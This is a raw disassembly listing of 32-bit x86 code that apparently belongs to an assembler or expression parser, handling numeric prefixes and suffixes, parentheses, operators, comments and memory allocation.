  40396b:	e8 99 0a 00 00       	call   0x404409
  403970:	72 7c                	jb     0x4039ee
  403972:	e8 e9 07 00 00       	call   0x404160
  403977:	72 75                	jb     0x4039ee
  403979:	80 3f 23             	cmpb   $0x23,(%edi)
  40397c:	75 04                	jne    0x403982
  40397e:	47                   	inc    %edi
  40397f:	49                   	dec    %ecx
  403980:	74 6c                	je     0x4039ee
  403982:	e8 7c 09 00 00       	call   0x404303
  403987:	72 db                	jb     0x403964
  403989:	74 1b                	je     0x4039a6
  40398b:	83 fb 03             	cmp    $0x3,%ebx
  40398e:	72 d4                	jb     0x403964
  403990:	66 81 3e 30 78       	cmpw   $0x7830,(%esi)
  403995:	74 07                	je     0x40399e
  403997:	66 81 3e 30 58       	cmpw   $0x5830,(%esi)
  40399c:	75 c6                	jne    0x403964
  40399e:	83 c6 02             	add    $0x2,%esi
  4039a1:	83 eb 02             	sub    $0x2,%ebx
  4039a4:	eb 16                	jmp    0x4039bc
  4039a6:	80 3e 2e             	cmpb   $0x2e,(%esi)
  4039a9:	75 04                	jne    0x4039af
  4039ab:	46                   	inc    %esi
  4039ac:	4b                   	dec    %ebx
  4039ad:	74 b5                	je     0x403964
  4039af:	e8 93 ff ff ff       	call   0x403947
  4039b4:	75 06                	jne    0x4039bc
  4039b6:	89 3d 80 ab 40 00    	mov    %edi,0x40ab80
  4039bc:	80 0d c9 ab 40 00 10 	orb    $0x10,0x40abc9
  4039c3:	e8 29 fa ff ff       	call   0x4033f1
  4039c8:	73 0d                	jae    0x4039d7
  4039ca:	80 25 c9 ab 40 00 ef 	andb   $0xef,0x40abc9
  4039d1:	09 d2                	or     %edx,%edx
  4039d3:	75 39                	jne    0x403a0e
  4039d5:	eb 8d                	jmp    0x403964
  4039d7:	80 25 c9 ab 40 00 ef 	andb   $0xef,0x40abc9
  4039de:	89 35 90 ab 40 00    	mov    %esi,0x40ab90
  4039e4:	e8 11 fe ff ff       	call   0x4037fa
  4039e9:	72 23                	jb     0x403a0e
  4039eb:	31 d2                	xor    %edx,%edx
  4039ed:	c3                   	ret
  4039ee:	80 0d c9 ab 40 00 40 	orb    $0x40,0x40abc9
  4039f5:	e8 f7 fe ff ff       	call   0x4038f1
  4039fa:	72 12                	jb     0x403a0e
  4039fc:	80 25 c9 ab 40 00 bf 	andb   $0xbf,0x40abc9
  403a03:	e8 e9 fe ff ff       	call   0x4038f1
  403a08:	72 04                	jb     0x403a0e
  403a0a:	83 ff 00             	cmp    $0x0,%edi
  403a0d:	c3                   	ret
  403a0e:	80 25 c9 ab 40 00 bf 	andb   $0xbf,0x40abc9
  403a15:	f9                   	stc
  403a16:	c3                   	ret
  403a17:	31 f6                	xor    %esi,%esi
  403a19:	80 3f 28             	cmpb   $0x28,(%edi)
  403a1c:	75 0f                	jne    0x403a2d
  403a1e:	42                   	inc    %edx
  403a1f:	39 da                	cmp    %ebx,%edx
  403a21:	76 0a                	jbe    0x403a2d
  403a23:	39 ea                	cmp    %ebp,%edx
  403a25:	77 06                	ja     0x403a2d
  403a27:	89 fe                	mov    %edi,%esi
  403a29:	89 d3                	mov    %edx,%ebx
  403a2b:	eb 08                	jmp    0x403a35
  403a2d:	80 3f 29             	cmpb   $0x29,(%edi)
  403a30:	75 03                	jne    0x403a35
  403a32:	4a                   	dec    %edx
  403a33:	78 3d                	js     0x403a72
  403a35:	47                   	inc    %edi
  403a36:	49                   	dec    %ecx
  403a37:	75 e0                	jne    0x403a19
  403a39:	83 fe 00             	cmp    $0x0,%esi
  403a3c:	74 33                	je     0x403a71
  403a3e:	f7 c2 01 00 00 00    	test   $0x1,%edx
  403a44:	75 2c                	jne    0x403a72
  403a46:	89 da                	mov    %ebx,%edx
  403a48:	89 f7                	mov    %esi,%edi
  403a4a:	8b 0d 94 ab 40 00    	mov    0x40ab94,%ecx
  403a50:	29 f9                	sub    %edi,%ecx
  403a52:	47                   	inc    %edi
  403a53:	49                   	dec    %ecx
  403a54:	74 1c                	je     0x403a72
  403a56:	80 3f 28             	cmpb   $0x28,(%edi)
  403a59:	75 03                	jne    0x403a5e
  403a5b:	42                   	inc    %edx
  403a5c:	eb f4                	jmp    0x403a52
  403a5e:	80 3f 29             	cmpb   $0x29,(%edi)
  403a61:	75 ef                	jne    0x403a52
  403a63:	39 da                	cmp    %ebx,%edx
  403a65:	74 03                	je     0x403a6a
  403a67:	4a                   	dec    %edx
  403a68:	eb e8                	jmp    0x403a52
  403a6a:	46                   	inc    %esi
  403a6b:	89 f9                	mov    %edi,%ecx
  403a6d:	29 f1                	sub    %esi,%ecx
  403a6f:	89 f7                	mov    %esi,%edi
  403a71:	c3                   	ret
  403a72:	ba 90 08 00 00       	mov    $0x890,%edx
  403a77:	f9                   	stc
  403a78:	c3                   	ret
  403a79:	55                   	push   %ebp
  403a7a:	31 ed                	xor    %ebp,%ebp
  403a7c:	4d                   	dec    %ebp
  403a7d:	74 45                	je     0x403ac4
  403a7f:	8b 3d 8c ab 40 00    	mov    0x40ab8c,%edi
  403a85:	8b 0d 94 ab 40 00    	mov    0x40ab94,%ecx
  403a8b:	29 f9                	sub    %edi,%ecx
  403a8d:	76 35                	jbe    0x403ac4
  403a8f:	31 d2                	xor    %edx,%edx
  403a91:	31 db                	xor    %ebx,%ebx
  403a93:	e8 7f ff ff ff       	call   0x403a17
  403a98:	72 58                	jb     0x403af2
  403a9a:	74 28                	je     0x403ac4
  403a9c:	89 dd                	mov    %ebx,%ebp
  403a9e:	53                   	push   %ebx
  403a9f:	57                   	push   %edi
  403aa0:	e8 b5 fe ff ff       	call   0x40395a
  403aa5:	5f                   	pop    %edi
  403aa6:	5b                   	pop    %ebx
  403aa7:	72 49                	jb     0x403af2
  403aa9:	74 cf                	je     0x403a7a
  403aab:	8b 0d 94 ab 40 00    	mov    0x40ab94,%ecx
  403ab1:	29 f9                	sub    %edi,%ecx
  403ab3:	76 0f                	jbe    0x403ac4
  403ab5:	89 da                	mov    %ebx,%edx
  403ab7:	31 db                	xor    %ebx,%ebx
  403ab9:	e8 59 ff ff ff       	call   0x403a17
  403abe:	72 32                	jb     0x403af2
  403ac0:	75 dc                	jne    0x403a9e
  403ac2:	eb b8                	jmp    0x403a7c
  403ac4:	8b 3d 8c ab 40 00    	mov    0x40ab8c,%edi
  403aca:	8b 0d 94 ab 40 00    	mov    0x40ab94,%ecx
  403ad0:	29 f9                	sub    %edi,%ecx
  403ad2:	76 1e                	jbe    0x403af2
  403ad4:	e8 81 fe ff ff       	call   0x40395a
  403ad9:	72 17                	jb     0x403af2
  403adb:	74 e7                	je     0x403ac4
  403add:	a1 94 ab 40 00       	mov    0x40ab94,%eax
  403ae2:	a3 90 ab 40 00       	mov    %eax,0x40ab90
  403ae7:	c7 05 80 ab 40 00 00 	movl   $0x0,0x40ab80
  403aee:	00 00 00 
  403af1:	f8                   	clc
  403af2:	5d                   	pop    %ebp
  403af3:	c3                   	ret
  403af4:	47                   	inc    %edi
  403af5:	49                   	dec    %ecx
  403af6:	74 0f                	je     0x403b07
  403af8:	80 3f 20             	cmpb   $0x20,(%edi)
  403afb:	74 0a                	je     0x403b07
  403afd:	80 3f 09             	cmpb   $0x9,(%edi)
  403b00:	74 05                	je     0x403b07
  403b02:	80 3f 0d             	cmpb   $0xd,(%edi)
  403b05:	75 ed                	jne    0x403af4
  403b07:	c3                   	ret
  403b08:	e8 6d f6 ff ff       	call   0x40317a
  403b0d:	75 02                	jne    0x403b11
  403b0f:	f9                   	stc
  403b10:	c3                   	ret
  403b11:	f6 05 ca ab 40 00 80 	testb  $0x80,0x40abca
  403b18:	74 09                	je     0x403b23
  403b1a:	80 25 ca ab 40 00 7f 	andb   $0x7f,0x40abca
  403b21:	eb 38                	jmp    0x403b5b
  403b23:	e8 1f fe ff ff       	call   0x403947
  403b28:	75 0d                	jne    0x403b37
  403b2a:	89 c7                	mov    %eax,%edi
  403b2c:	89 d1                	mov    %edx,%ecx
  403b2e:	e8 ad fa ff ff       	call   0x4035e0
  403b33:	72 58                	jb     0x403b8d
  403b35:	eb 24                	jmp    0x403b5b
  403b37:	80 3f 2e             	cmpb   $0x2e,(%edi)
  403b3a:	75 07                	jne    0x403b43
  403b3c:	e8 b3 ff ff ff       	call   0x403af4
  403b41:	eb 18                	jmp    0x403b5b
  403b43:	e8 a9 f8 ff ff       	call   0x4033f1
  403b48:	72 43                	jb     0x403b8d
  403b4a:	83 7a 0c 04          	cmpl   $0x4,0xc(%edx)
  403b4e:	75 3c                	jne    0x403b8c
  403b50:	51                   	push   %ecx
  403b51:	57                   	push   %edi
  403b52:	e8 aa fa ff ff       	call   0x403601
  403b57:	72 34                	jb     0x403b8d
  403b59:	eb 06                	jmp    0x403b61
  403b5b:	51                   	push   %ecx
  403b5c:	57                   	push   %edi
  403b5d:	89 fa                	mov    %edi,%edx
  403b5f:	29 f2                	sub    %esi,%edx
  403b61:	a1 94 ab 40 00       	mov    0x40ab94,%eax
  403b66:	31 db                	xor    %ebx,%ebx
  403b68:	e8 fa fa ff ff       	call   0x403667
  403b6d:	72 14                	jb     0x403b83
  403b6f:	8b 3d 94 ab 40 00    	mov    0x40ab94,%edi
  403b75:	c6 07 20             	movb   $0x20,(%edi)
  403b78:	ff 05 94 ab 40 00    	incl   0x40ab94
  403b7e:	e8 f6 fe ff ff       	call   0x403a79
  403b83:	5f                   	pop    %edi
  403b84:	59                   	pop    %ecx
  403b85:	72 06                	jb     0x403b8d
  403b87:	ba 9c ab 40 00       	mov    $0x40ab9c,%edx
  403b8c:	f8                   	clc
  403b8d:	c3                   	ret
  403b8e:	89 15 a8 aa 40 00    	mov    %edx,0x40aaa8
  403b94:	81 fa 9c ab 40 00    	cmp    $0x40ab9c,%edx
  403b9a:	74 05                	je     0x403ba1
  403b9c:	83 7a 0c 01          	cmpl   $0x1,0xc(%edx)
  403ba0:	c3                   	ret
  403ba1:	89 4a 18             	mov    %ecx,0x18(%edx)
  403ba4:	89 7a 1c             	mov    %edi,0x1c(%edx)
  403ba7:	8b 0d 94 ab 40 00    	mov    0x40ab94,%ecx
  403bad:	8b 3d 8c ab 40 00    	mov    0x40ab8c,%edi
  403bb3:	29 f9                	sub    %edi,%ecx
  403bb5:	72 12                	jb     0x403bc9
  403bb7:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  403bbe:	00 00 00 
  403bc1:	ff 05 00 ab 40 00    	incl   0x40ab00
  403bc7:	f9                   	stc
  403bc8:	c3                   	ret
  403bc9:	31 c9                	xor    %ecx,%ecx
  403bcb:	c3                   	ret
  403bcc:	53                   	push   %ebx
  403bcd:	56                   	push   %esi
  403bce:	80 7c 1e ff 68       	cmpb   $0x68,-0x1(%esi,%ebx,1)
  403bd3:	74 07                	je     0x403bdc
  403bd5:	80 7c 1e ff 48       	cmpb   $0x48,-0x1(%esi,%ebx,1)
  403bda:	75 0a                	jne    0x403be6
  403bdc:	4b                   	dec    %ebx
  403bdd:	74 74                	je     0x403c53
  403bdf:	e8 ac ef ff ff       	call   0x402b90
  403be4:	eb 6e                	jmp    0x403c54
  403be6:	66 81 3e 30 78       	cmpw   $0x7830,(%esi)
  403beb:	74 07                	je     0x403bf4
  403bed:	66 81 3e 30 58       	cmpw   $0x5830,(%esi)
  403bf2:	75 62                	jne    0x403c56
  403bf4:	83 c6 02             	add    $0x2,%esi
  403bf7:	83 eb 02             	sub    $0x2,%ebx
  403bfa:	76 57                	jbe    0x403c53
  403bfc:	80 7c 1e ff 4c       	cmpb   $0x4c,-0x1(%esi,%ebx,1)
  403c01:	74 07                	je     0x403c0a
  403c03:	80 7c 1e ff 6c       	cmpb   $0x6c,-0x1(%esi,%ebx,1)
  403c08:	75 03                	jne    0x403c0d
  403c0a:	4b                   	dec    %ebx
  403c0b:	74 46                	je     0x403c53
  403c0d:	e8 7e ef ff ff       	call   0x402b90
  403c12:	73 40                	jae    0x403c54
  403c14:	5e                   	pop    %esi
  403c15:	5b                   	pop    %ebx
  403c16:	53                   	push   %ebx
  403c17:	56                   	push   %esi
  403c18:	f6 05 ca ab 40 00 40 	testb  $0x40,0x40abca
  403c1f:	75 32                	jne    0x403c53
  403c21:	80 0d ca ab 40 00 80 	orb    $0x80,0x40abca
  403c28:	e8 db fe ff ff       	call   0x403b08
  403c2d:	72 24                	jb     0x403c53
  403c2f:	e8 5a ff ff ff       	call   0x403b8e
  403c34:	72 04                	jb     0x403c3a
  403c36:	75 1b                	jne    0x403c53
  403c38:	eb 1a                	jmp    0x403c54
  403c3a:	e8 ca 07 00 00       	call   0x404409
  403c3f:	72 12                	jb     0x403c53
  403c41:	74 10                	je     0x403c53
  403c43:	e8 bb 06 00 00       	call   0x404303
  403c48:	72 09                	jb     0x403c53
  403c4a:	74 07                	je     0x403c53
  403c4c:	58                   	pop    %eax
  403c4d:	58                   	pop    %eax
  403c4e:	e9 79 ff ff ff       	jmp    0x403bcc
  403c53:	f9                   	stc
  403c54:	eb 1c                	jmp    0x403c72
  403c56:	8a 44 1e ff          	mov    -0x1(%esi,%ebx,1),%al
  403c5a:	3c 64                	cmp    $0x64,%al
  403c5c:	74 0c                	je     0x403c6a
  403c5e:	3c 44                	cmp    $0x44,%al
  403c60:	74 08                	je     0x403c6a
  403c62:	3c 4c                	cmp    $0x4c,%al
  403c64:	74 04                	je     0x403c6a
  403c66:	3c 6c                	cmp    $0x6c,%al
  403c68:	75 03                	jne    0x403c6d
  403c6a:	4b                   	dec    %ebx
  403c6b:	74 e6                	je     0x403c53
  403c6d:	e8 75 ef ff ff       	call   0x402be7
  403c72:	5e                   	pop    %esi
  403c73:	5b                   	pop    %ebx
  403c74:	9c                   	pushf
  403c75:	80 25 ca ab 40 00 bf 	andb   $0xbf,0x40abca
  403c7c:	9d                   	popf
  403c7d:	c3                   	ret
  403c7e:	f6 05 c8 ab 40 00 c0 	testb  $0xc0,0x40abc8
  403c85:	74 16                	je     0x403c9d
  403c87:	f6 05 c8 ab 40 00 40 	testb  $0x40,0x40abc8
  403c8e:	74 04                	je     0x403c94
  403c90:	f7 d0                	not    %eax
  403c92:	eb 02                	jmp    0x403c96
  403c94:	f7 d8                	neg    %eax
  403c96:	80 25 c8 ab 40 00 3f 	andb   $0x3f,0x40abc8
  403c9d:	f8                   	clc
  403c9e:	c3                   	ret
  403c9f:	3d ff ff 00 00       	cmp    $0xffff,%eax
  403ca4:	77 23                	ja     0x403cc9
  403ca6:	f6 05 c8 ab 40 00 c0 	testb  $0xc0,0x40abc8
  403cad:	74 18                	je     0x403cc7
  403caf:	f6 05 c8 ab 40 00 40 	testb  $0x40,0x40abc8
  403cb6:	74 05                	je     0x403cbd
  403cb8:	66 f7 d0             	not    %ax
  403cbb:	eb 03                	jmp    0x403cc0
  403cbd:	66 f7 d8             	neg    %ax
  403cc0:	80 25 c8 ab 40 00 3f 	andb   $0x3f,0x40abc8
  403cc7:	f8                   	clc
  403cc8:	c3                   	ret
  403cc9:	80 25 c8 ab 40 00 3f 	andb   $0x3f,0x40abc8
  403cd0:	ba 82 08 00 00       	mov    $0x882,%edx
  403cd5:	f9                   	stc
  403cd6:	c3                   	ret
  403cd7:	3d ff 00 00 00       	cmp    $0xff,%eax
  403cdc:	77 21                	ja     0x403cff
  403cde:	f6 05 c8 ab 40 00 c0 	testb  $0xc0,0x40abc8
  403ce5:	74 16                	je     0x403cfd
  403ce7:	f6 05 c8 ab 40 00 40 	testb  $0x40,0x40abc8
  403cee:	74 04                	je     0x403cf4
  403cf0:	f6 d0                	not    %al
  403cf2:	eb 02                	jmp    0x403cf6
  403cf4:	f6 d8                	neg    %al
  403cf6:	80 25 c8 ab 40 00 3f 	andb   $0x3f,0x40abc8
  403cfd:	f8                   	clc
  403cfe:	c3                   	ret
  403cff:	80 25 c8 ab 40 00 3f 	andb   $0x3f,0x40abc8
  403d06:	ba 82 08 00 00       	mov    $0x882,%edx
  403d0b:	f9                   	stc
  403d0c:	c3                   	ret
  403d0d:	83 fb 03             	cmp    $0x3,%ebx
  403d10:	77 2d                	ja     0x403d3f
  403d12:	75 1c                	jne    0x403d30
  403d14:	66 81 3e 4e 4f       	cmpw   $0x4f4e,(%esi)
  403d19:	75 06                	jne    0x403d21
  403d1b:	80 7e 02 54          	cmpb   $0x54,0x2(%esi)
  403d1f:	74 19                	je     0x403d3a
  403d21:	66 81 3e 6e 6f       	cmpw   $0x6f6e,(%esi)
  403d26:	75 17                	jne    0x403d3f
  403d28:	80 7e 02 74          	cmpb   $0x74,0x2(%esi)
  403d2c:	74 0c                	je     0x403d3a
  403d2e:	eb 0f                	jmp    0x403d3f
  403d30:	83 fb 01             	cmp    $0x1,%ebx
  403d33:	75 0a                	jne    0x403d3f
  403d35:	80 3e 21             	cmpb   $0x21,(%esi)
  403d38:	75 05                	jne    0x403d3f
  403d3a:	b8 21 00 00 00       	mov    $0x21,%eax
  403d3f:	c3                   	ret
  403d40:	8b 72 1c             	mov    0x1c(%edx),%esi
  403d43:	8b 5a 18             	mov    0x18(%edx),%ebx
  403d46:	46                   	inc    %esi
  403d47:	83 eb 02             	sub    $0x2,%ebx
  403d4a:	72 0c                	jb     0x403d58
  403d4c:	83 7a 0c 02          	cmpl   $0x2,0xc(%edx)
  403d50:	74 04                	je     0x403d56
  403d52:	46                   	inc    %esi
  403d53:	4b                   	dec    %ebx
  403d54:	78 02                	js     0x403d58
  403d56:	f8                   	clc
  403d57:	c3                   	ret
  403d58:	f9                   	stc
  403d59:	c3                   	ret
  403d5a:	51                   	push   %ecx
  403d5b:	57                   	push   %edi
  403d5c:	8b 3d 68 aa 40 00    	mov    0x40aa68,%edi
  403d62:	89 d1                	mov    %edx,%ecx
  403d64:	31 c0                	xor    %eax,%eax
  403d66:	f3 aa                	rep stos %al,%es:(%edi)
  403d68:	5f                   	pop    %edi
  403d69:	59                   	pop    %ecx
  403d6a:	c3                   	ret
  403d6b:	89 f3                	mov    %esi,%ebx
  403d6d:	e3 27                	jecxz  0x403d96
  403d6f:	8a 03                	mov    (%ebx),%al
  403d71:	3c 0d                	cmp    $0xd,%al
  403d73:	74 21                	je     0x403d96
  403d75:	3c 3b                	cmp    $0x3b,%al
  403d77:	74 1d                	je     0x403d96
  403d79:	38 e0                	cmp    %ah,%al
  403d7b:	74 19                	je     0x403d96
  403d7d:	3c 2f                	cmp    $0x2f,%al
  403d7f:	75 11                	jne    0x403d92
  403d81:	83 f9 01             	cmp    $0x1,%ecx
  403d84:	74 0c                	je     0x403d92
  403d86:	80 7b 01 2f          	cmpb   $0x2f,0x1(%ebx)
  403d8a:	74 0a                	je     0x403d96
  403d8c:	80 7b 01 2a          	cmpb   $0x2a,0x1(%ebx)
  403d90:	74 04                	je     0x403d96
  403d92:	43                   	inc    %ebx
  403d93:	49                   	dec    %ecx
  403d94:	75 d9                	jne    0x403d6f
  403d96:	29 f3                	sub    %esi,%ebx
  403d98:	c3                   	ret
  403d99:	6a 04                	push   $0x4
  403d9b:	68 00 20 00 00       	push   $0x2000
  403da0:	50                   	push   %eax
  403da1:	6a 00                	push   $0x0
  403da3:	e8 a6 e2 00 00       	call   0x41204e
  403da8:	09 c0                	or     %eax,%eax
  403daa:	74 17                	je     0x403dc3
  403dac:	6a 04                	push   $0x4
  403dae:	68 00 10 00 00       	push   $0x1000
  403db3:	68 00 10 00 00       	push   $0x1000
  403db8:	50                   	push   %eax
  403db9:	e8 90 e2 00 00       	call   0x41204e
  403dbe:	09 c0                	or     %eax,%eax
  403dc0:	74 01                	je     0x403dc3
  403dc2:	c3                   	ret
  403dc3:	ba 3f a4 40 00       	mov    $0x40a43f,%edx
  403dc8:	e8 72 d3 ff ff       	call   0x40113f
  403dcd:	f9                   	stc
  403dce:	c3                   	ret
  403dcf:	b8 00 00 10 00       	mov    $0x100000,%eax
  403dd4:	e8 c0 ff ff ff       	call   0x403d99
  403dd9:	72 19                	jb     0x403df4
  403ddb:	a3 60 aa 40 00       	mov    %eax,0x40aa60
  403de0:	a3 64 aa 40 00       	mov    %eax,0x40aa64
  403de5:	a3 68 aa 40 00       	mov    %eax,0x40aa68
  403dea:	c7 05 6c aa 40 00 00 	movl   $0x1000,0x40aa6c
  403df1:	10 00 00 
  403df4:	c3                   	ret
  403df5:	b8 00 00 00 02       	mov    $0x2000000,%eax
  403dfa:	e8 9a ff ff ff       	call   0x403d99
  403dff:	72 14                	jb     0x403e15
  403e01:	a3 70 aa 40 00       	mov    %eax,0x40aa70
  403e06:	a3 78 aa 40 00       	mov    %eax,0x40aa78
  403e0b:	05 00 10 00 00       	add    $0x1000,%eax
  403e10:	a3 74 aa 40 00       	mov    %eax,0x40aa74
  403e15:	c3                   	ret
  403e16:	b8 00 00 20 00       	mov    $0x200000,%eax
  403e1b:	e8 79 ff ff ff       	call   0x403d99
  403e20:	72 1e                	jb     0x403e40
  403e22:	a3 88 ab 40 00       	mov    %eax,0x40ab88
  403e27:	a3 8c ab 40 00       	mov    %eax,0x40ab8c
  403e2c:	a3 94 ab 40 00       	mov    %eax,0x40ab94
  403e31:	a3 90 ab 40 00       	mov    %eax,0x40ab90
  403e36:	05 00 10 00 00       	add    $0x1000,%eax
  403e3b:	a3 98 ab 40 00       	mov    %eax,0x40ab98
  403e40:	c3                   	ret
  403e41:	e3 1d                	jecxz  0x403e60
  403e43:	68 00 80 00 00       	push   $0x8000
  403e48:	6a 00                	push   $0x0
  403e4a:	51                   	push   %ecx
  403e4b:	68 00 40 00 00       	push   $0x4000
  403e50:	68 00 00 10 00       	push   $0x100000
  403e55:	51                   	push   %ecx
  403e56:	e8 17 e2 00 00       	call   0x412072
  403e5b:	e8 12 e2 00 00       	call   0x412072
  403e60:	c3                   	ret
  403e61:	8b 0d 60 aa 40 00    	mov    0x40aa60,%ecx
  403e67:	e8 d5 ff ff ff       	call   0x403e41
  403e6c:	c7 05 60 aa 40 00 00 	movl   $0x0,0x40aa60
  403e73:	00 00 00 
  403e76:	c3                   	ret
  403e77:	8b 0d 88 ab 40 00    	mov    0x40ab88,%ecx
  403e7d:	e8 bf ff ff ff       	call   0x403e41
  403e82:	c7 05 88 ab 40 00 00 	movl   $0x0,0x40ab88
  403e89:	00 00 00 
  403e8c:	c3                   	ret
  403e8d:	8b 0d 70 aa 40 00    	mov    0x40aa70,%ecx
  403e93:	e8 a9 ff ff ff       	call   0x403e41
  403e98:	c7 05 70 aa 40 00 00 	movl   $0x0,0x40aa70
  403e9f:	00 00 00 
  403ea2:	c3                   	ret
  403ea3:	50                   	push   %eax
  403ea4:	51                   	push   %ecx
  403ea5:	52                   	push   %edx
  403ea6:	6a 04                	push   $0x4
  403ea8:	68 00 10 00 00       	push   $0x1000
  403ead:	68 00 10 00 00       	push   $0x1000
  403eb2:	ff 35 68 aa 40 00    	push   0x40aa68
  403eb8:	e8 91 e1 00 00       	call   0x41204e
  403ebd:	5a                   	pop    %edx
  403ebe:	09 c0                	or     %eax,%eax
  403ec0:	74 12                	je     0x403ed4
  403ec2:	c7 05 6c aa 40 00 00 	movl   $0x1000,0x40aa6c
  403ec9:	10 00 00 
  403ecc:	29 15 6c aa 40 00    	sub    %edx,0x40aa6c
  403ed2:	eb 0d                	jmp    0x403ee1
  403ed4:	01 15 6c aa 40 00    	add    %edx,0x40aa6c
  403eda:	ba 8a 18 01 00       	mov    $0x1188a,%edx
  403edf:	31 c9                	xor    %ecx,%ecx
  403ee1:	59                   	pop    %ecx
  403ee2:	58                   	pop    %eax
  403ee3:	c3                   	ret
  403ee4:	09 c0                	or     %eax,%eax
  403ee6:	74 0b                	je     0x403ef3
  403ee8:	2b 05 64 aa 40 00    	sub    0x40aa64,%eax
  403eee:	c1 e8 04             	shr    $0x4,%eax
  403ef1:	40                   	inc    %eax
  403ef2:	40                   	inc    %eax
  403ef3:	c3                   	ret
  403ef4:	f7 c2 ff 0f 00 00    	test   $0xfff,%edx
  403efa:	74 08                	je     0x403f04
  403efc:	f7 c2 00 00 00 80    	test   $0x80000000,%edx
  403f02:	74 01                	je     0x403f05
  403f04:	c3                   	ret
  403f05:	55                   	push   %ebp
  403f06:	53                   	push   %ebx
  403f07:	51                   	push   %ecx
  403f08:	57                   	push   %edi
  403f09:	56                   	push   %esi
  403f0a:	89 d5                	mov    %edx,%ebp
  403f0c:	f7 c5 00 08 00 00    	test   $0x800,%ebp
  403f12:	75 08                	jne    0x403f1c
  403f14:	ff 05 a0 aa 40 00    	incl   0x40aaa0
  403f1a:	eb 06                	jmp    0x403f22
  403f1c:	ff 05 a4 aa 40 00    	incl   0x40aaa4
  403f22:	ba 20 00 00 00       	mov    $0x20,%edx
  403f27:	29 15 6c aa 40 00    	sub    %edx,0x40aa6c
  403f2d:	77 0b                	ja     0x403f3a
  403f2f:	e8 6f ff ff ff       	call   0x403ea3
  403f34:	0f 84 92 01 00 00    	je     0x4040cc
  403f3a:	e8 1b fe ff ff       	call   0x403d5a
  403f3f:	8b 15 68 aa 40 00    	mov    0x40aa68,%edx
  403f45:	a1 b0 aa 40 00       	mov    0x40aab0,%eax
  403f4a:	09 c0                	or     %eax,%eax
  403f4c:	74 15                	je     0x403f63
  403f4e:	81 cd 00 00 04 00    	or     $0x40000,%ebp
  403f54:	89 42 10             	mov    %eax,0x10(%edx)
  403f57:	c7 05 b0 aa 40 00 00 	movl   $0x0,0x40aab0
  403f5e:	00 00 00 
  403f61:	eb 1c                	jmp    0x403f7f
  403f63:	a1 a8 aa 40 00       	mov    0x40aaa8,%eax
  403f68:	09 c0                	or     %eax,%eax
  403f6a:	74 13                	je     0x403f7f
  403f6c:	81 cd 00 00 02 00    	or     $0x20000,%ebp
  403f72:	89 42 10             	mov    %eax,0x10(%edx)
  403f75:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  403f7c:	00 00 00 
  403f7f:	f6 05 c9 ab 40 00 02 	testb  $0x2,0x40abc9
  403f86:	74 0c                	je     0x403f94
  403f88:	81 e5 ff f7 ff ff    	and    $0xfffff7ff,%ebp
  403f8e:	81 cd 00 04 00 00    	or     $0x400,%ebp
  403f94:	f6 05 c9 ab 40 00 08 	testb  $0x8,0x40abc9
  403f9b:	74 08                	je     0x403fa5
  403f9d:	66 c7 42 04 01 00    	movw   $0x1,0x4(%edx)
  403fa3:	eb 65                	jmp    0x40400a
  403fa5:	f7 c5 00 00 01 00    	test   $0x10000,%ebp
  403fab:	75 5d                	jne    0x40400a
  403fad:	f7 c5 00 00 00 10    	test   $0x10000000,%ebp
  403fb3:	74 0a                	je     0x403fbf
  403fb5:	a1 ac aa 40 00       	mov    0x40aaac,%eax
  403fba:	8b 40 14             	mov    0x14(%eax),%eax
  403fbd:	eb 10                	jmp    0x403fcf
  403fbf:	f7 c5 00 00 00 08    	test   $0x8000000,%ebp
  403fc5:	74 0d                	je     0x403fd4
  403fc7:	a1 8c aa 40 00       	mov    0x40aa8c,%eax
  403fcc:	8b 40 04             	mov    0x4(%eax),%eax
  403fcf:	89 42 04             	mov    %eax,0x4(%edx)
  403fd2:	eb 36                	jmp    0x40400a
  403fd4:	a1 04 ab 40 00       	mov    0x40ab04,%eax
  403fd9:	f7 c5 00 00 00 02    	test   $0x2000000,%ebp
  403fdf:	75 17                	jne    0x403ff8
  403fe1:	a1 0c ab 40 00       	mov    0x40ab0c,%eax
  403fe6:	f6 05 c9 ab 40 00 02 	testb  $0x2,0x40abc9
  403fed:	74 09                	je     0x403ff8
  403fef:	a1 88 aa 40 00       	mov    0x40aa88,%eax
  403ff4:	66 8b 40 36          	mov    0x36(%eax),%ax
  403ff8:	66 89 42 06          	mov    %ax,0x6(%edx)
  403ffc:	a1 88 aa 40 00       	mov    0x40aa88,%eax
  404001:	e8 de fe ff ff       	call   0x403ee4
  404006:	66 89 42 04          	mov    %ax,0x4(%edx)
  40400a:	f7 c5 00 10 00 00    	test   $0x1000,%ebp
  404010:	0f 85 a7 00 00 00    	jne    0x4040bd
  404016:	f7 c5 00 00 00 01    	test   $0x1000000,%ebp
  40401c:	0f 85 7d 00 00 00    	jne    0x40409f
  404022:	8b 35 14 ab 40 00    	mov    0x40ab14,%esi
  404028:	8b 1d 18 ab 40 00    	mov    0x40ab18,%ebx
  40402e:	f7 c5 00 00 00 76    	test   $0x76000000,%ebp
  404034:	74 69                	je     0x40409f
  404036:	a1 10 ab 40 00       	mov    0x40ab10,%eax
  40403b:	29 c6                	sub    %eax,%esi
  40403d:	72 0c                	jb     0x40404b
  40403f:	01 f3                	add    %esi,%ebx
  404041:	89 c6                	mov    %eax,%esi
  404043:	f7 c5 00 00 00 20    	test   $0x20000000,%ebp
  404049:	75 54                	jne    0x40409f
  40404b:	8b 35 1c ab 40 00    	mov    0x40ab1c,%esi
  404051:	8b 0d 20 ab 40 00    	mov    0x40ab20,%ecx
  404057:	30 e4                	xor    %ah,%ah
  404059:	f7 c5 00 00 00 04    	test   $0x4000000,%ebp
  40405f:	75 39                	jne    0x40409a
  404061:	01 f1                	add    %esi,%ecx
  404063:	8b 35 08 ab 40 00    	mov    0x40ab08,%esi
  404069:	29 f1                	sub    %esi,%ecx
  40406b:	30 e4                	xor    %ah,%ah
  40406d:	f7 c5 00 00 00 02    	test   $0x2000000,%ebp
  404073:	75 25                	jne    0x40409a
  404075:	f7 c5 00 00 00 10    	test   $0x10000000,%ebp
  40407b:	74 0f                	je     0x40408c
  40407d:	a1 ac aa 40 00       	mov    0x40aaac,%eax
  404082:	8b 70 08             	mov    0x8(%eax),%esi
  404085:	8b 48 04             	mov    0x4(%eax),%ecx
  404088:	30 e4                	xor    %ah,%ah
  40408a:	eb 0e                	jmp    0x40409a
  40408c:	8b 35 24 ab 40 00    	mov    0x40ab24,%esi
  404092:	8b 0d 28 ab 40 00    	mov    0x40ab28,%ecx
  404098:	b4 20                	mov    $0x20,%ah
